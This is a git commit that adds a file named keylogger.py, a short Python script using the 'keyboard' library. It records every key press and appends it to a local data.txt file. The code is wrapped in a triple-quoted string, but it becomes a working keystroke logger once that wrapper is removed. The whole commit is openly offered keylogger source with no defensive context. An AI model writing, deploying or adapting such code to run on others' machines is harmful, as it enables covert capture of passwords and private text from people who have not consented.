56f74b5333fbf1860d684d64ccd0366d1e0d82d0
Iracuza <aj_serra@hotmail.com>
2023-11-12 20:34:51 -0400

    new file:   keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,11 @@
+"""import keyboard
+
+def procesarKey(key):
+    with open('data.txt', 'a') as file:
+        if key.name== 'space':
+            file.write(' ')
+        else:
+            file.write(key.name)
+
+keyboard.on_press(procesarKey)
+keyboard.wait()"""
